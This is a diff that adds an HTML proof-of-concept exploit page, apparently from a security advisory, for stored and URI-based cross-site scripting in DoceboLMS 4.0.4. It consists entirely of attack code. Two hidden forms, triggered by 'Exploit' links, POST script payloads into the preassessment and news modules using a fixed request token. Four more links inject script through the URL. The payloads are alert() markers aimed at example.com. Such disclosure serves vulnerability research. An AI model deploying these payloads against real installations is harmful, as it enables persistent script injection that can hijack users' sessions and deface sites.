@@ -1,0 +1,43 @@
+&lt;html&gt;
+&lt;title&gt;DoceboLMS 4.0.4 Multiple Stored XSS Vulnerabilities&lt;/title&gt;
+&lt;body bgcolor=&quot;#1C1C1C&quot;&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+function xss1(){document.forms[&quot;xss1&quot;].submit();}
+function xss2(){document.forms[&quot;xss2&quot;].submit();}
+&lt;/script&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;form action=&quot;http://www.example.com/DoceboLMS_404/doceboCore/index.php?modname=preassessment&amp;op=modassessment&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;POST&quot; id=&quot;xss1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;authentic_request&quot; value=&quot;23dfee506a748201730ab2bb7486e77a&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;code&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;description&quot; value=&quot;ZSL&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id_assess&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;save&quot; value=&quot;Save changes&quot; /&gt;&lt;/form&gt;
+&lt;a href=&quot;javascript: xss1();&quot; style=&quot;text-decoration:none&quot;&gt;
+&lt;b&gt;&lt;font color=&quot;red&quot;&gt;&lt;center&gt;&lt;h3&gt;Exploit PreAssessment Module!&lt;/h3&gt;&lt;/center&gt;&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+
+&lt;form action=&quot;http://www.example.com/DoceboLMS_404/doceboCore/index.php?modname=news&amp;op=savenews&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;POST&quot; id=&quot;xss2&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;authentic_request&quot; value=&quot;23dfee506a748201730ab2bb7486e77a&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;language&quot; value=&quot;2&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;long_desc&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;news&quot; value=&quot;Insert&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;short_desc&quot; value=&quot;ZSL&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#039; /&gt;&lt;/form&gt;
+&lt;a href=&quot;javascript: xss2();&quot; style=&quot;text-decoration:none&quot;&gt;
+&lt;b&gt;&lt;font color=&quot;red&quot;&gt;&lt;center&gt;&lt;h3&gt;Exploit News Module!&lt;/h3&gt;&lt;/center&gt;&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+
+&lt;a href=&quot;http://www.example.com/DoceboLMS_404/index.php?&lt;script&gt;alert(1)&lt;/script&gt;&quot; style=&quot;text-decoration:none&quot;&gt;
+&lt;b&gt;&lt;font color=&quot;red&quot;&gt;&lt;center&gt;&lt;h3&gt;Exploit URI XSS #1&lt;/h3&gt;&lt;/center&gt;&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+
+&lt;a href=&quot;http://www.example.com/DoceboLMS_404/?&lt;script&gt;alert(1)&lt;/script&gt;&quot; style=&quot;text-decoration:none&quot;&gt;
+&lt;b&gt;&lt;font color=&quot;red&quot;&gt;&lt;center&gt;&lt;h3&gt;Exploit URI XSS #2&lt;/h3&gt;&lt;/center&gt;&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+
+&lt;a href=&quot;http://www.example.com/DoceboLMS_404/docebolms/index.php/index.php?&lt;script&gt;alert(1)&lt;/script&gt;&quot; style=&quot;text-decoration:none&quot;&gt;
+&lt;b&gt;&lt;font color=&quot;red&quot;&gt;&lt;center&gt;&lt;h3&gt;Exploit URI XSS #3&lt;/h3&gt;&lt;/center&gt;&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+
+&lt;a href=&quot;http://www.example.com/DoceboLMS_404/docebolms/?&lt;script&gt;alert(1)&lt;/script&gt;&quot; style=&quot;text-decoration:none&quot;&gt;
+&lt;b&gt;&lt;font color=&quot;red&quot;&gt;&lt;center&gt;&lt;h3&gt;Exploit URI XSS #4&lt;/h3&gt;&lt;/center&gt;&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+
+&lt;/body&gt;&lt;/html&gt;
